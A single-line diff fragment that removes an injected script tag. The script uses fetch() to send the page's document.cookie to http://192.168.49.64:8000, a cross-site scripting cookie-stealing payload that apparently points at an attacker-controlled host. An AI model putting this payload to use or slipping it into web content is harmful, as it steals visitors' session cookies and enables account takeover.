@@ -1,1 +1,0 @@
-<script>fetch("http://192.168.49.64:8000/x?".concat(document.cookie))</script>
